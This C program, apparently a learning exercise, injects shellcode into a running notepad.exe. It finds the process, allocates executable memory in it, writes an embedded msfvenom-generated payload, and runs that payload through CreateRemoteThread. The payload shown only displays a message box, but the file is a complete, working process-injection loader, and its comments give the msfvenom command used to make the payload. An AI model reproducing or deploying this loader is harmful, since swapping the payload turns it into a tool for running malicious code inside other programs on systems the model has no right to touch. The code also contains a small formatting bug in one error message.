// Reference: ChatGPT lmao
/*
https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/ns-tlhelp32-processentry32
https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot
To generate shellcode: msfvenom -p windows/x64/messagebox TEXT="Injected!" TITLE="Hi" -f c  # message box generation
*/
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>


unsigned char shellcode[] = "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xcc\x00\x00\x00\x41"
"\x51\x41\x50\x52\x48\x31\xd2\x51\x65\x48\x8b\x52\x60\x48"
"\x8b\x52\x18\x48\x8b\x52\x20\x56\x48\x0f\xb7\x4a\x4a\x48"
"\x8b\x72\x50\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02"
"\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51"
"\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18"
"\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00"
"\x48\x85\xc0\x74\x67\x48\x01\xd0\x44\x8b\x40\x20\x8b\x48"
"\x18\x50\x49\x01\xd0\xe3\x56\x48\xff\xc9\x4d\x31\xc9\x41"
"\x8b\x34\x88\x48\x01\xd6\x48\x31\xc0\xac\x41\xc1\xc9\x0d"
"\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39"
"\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b"
"\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48"
"\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41"
"\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
"\x8b\x12\xe9\x4b\xff\xff\xff\x5d\xe8\x0b\x00\x00\x00\x75"
"\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x00\x59\x41\xba\x4c"
"\x77\x26\x07\xff\xd5\x49\xc7\xc1\x00\x00\x00\x00\xe8\x0a"
"\x00\x00\x00\x49\x6e\x6a\x65\x63\x74\x65\x64\x21\x00\x5a"
"\xe8\x03\x00\x00\x00\x48\x69\x00\x41\x58\x48\x31\xc9\x41"
"\xba\x45\x83\x56\x07\xff\xd5\x48\x31\xc9\x41\xba\xf0\xb5"
"\xa2\x56\xff\xd5";

//{0x90, 0x90, 0xCC}; // NOP NOP INT3

DWORD GetPIDByName(const wchar_t *proc_name) {
    // https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/ns-tlhelp32-processentry32
    PROCESSENTRY32W entry;  // Describes an entry from a list of the processes residing in the system address space when a snapshot was taken.
    entry.dwSize = sizeof(PROCESSENTRY32W);

    // We are getting list of all running processes
    // In C HANDLE is a reference to an OS resource like process, thread, file and so on
    // https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0); // TH32CS_SNAPPROCESS Includes all processes in the system in the snapshot

    DWORD pid = 0;
    // basically just checking if any process entry was received
    if (Process32FirstW(snapshot,&entry)) {  // Retrieves information about the first process encountered in a system snapshot. Returns TRUE if the first entry of the process list has been copied to the buffer or FALSE otherwise
        do {
            if (_wcsicmp(entry.szExeFile,proc_name) == 0) { // _wcsicmp compares two wchar_t* strings case-insensitively. we are checking is exe file is matching
                pid = entry.th32ProcessID;
                return pid;
            }
        } while (Process32NextW(snapshot,&entry));  // while there is next process
    }

    CloseHandle(snapshot);
    return pid;
}

int main() {
    const wchar_t *notepad = L"notepad.exe"; // L in the front means wide string

    // Get pid of the target pocess
    DWORD pid = GetPIDByName(notepad);


    // if pid is still 0 it means no pid was found
    if (!pid) {
        printf("Process not found\n");
        return -1;
    }


    // Get handle to the pid process
    HANDLE hproc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hproc) {
        printf("Failed to open target process\n");
        DWORD error = GetLastError();
        printf("OpenProcess error was %s\n",error);
        return -1;
    }

    printf("process name=%s and process pid=%d\n",notepad,pid);

    // Allocate memory to that process
    LPVOID remoteBuf = VirtualAllocEx(hproc, NULL, sizeof(shellcode),MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (!remoteBuf) {
        printf("VirtualAllocationFailed\n");
        DWORD error = GetLastError();
        printf("Allocation error was %lu\n",error);
        return -1;
    }

    printf("Allocated address %p\n",remoteBuf);

    // Write to that allocated memory
    BOOL ret = WriteProcessMemory(hproc,remoteBuf,shellcode,sizeof(shellcode),NULL);
    if (!ret) {
        DWORD error = GetLastError();
        printf("WriteProcessMemory error was %lu\n",error);
    }

    // Start the routine in that allocated injected space
    HANDLE hThread = CreateRemoteThread(hproc,NULL,0,(LPTHREAD_START_ROUTINE)remoteBuf,NULL,0,NULL);
    if (!hThread) {
        DWORD error = GetLastError();
        printf("CreateRemoteThread Error was %lu\n",error);
        return -1;
    }

    printf("Process Injection successfull\n");
    
    CloseHandle(hThread);
    CloseHandle(hproc);
    return 0;
}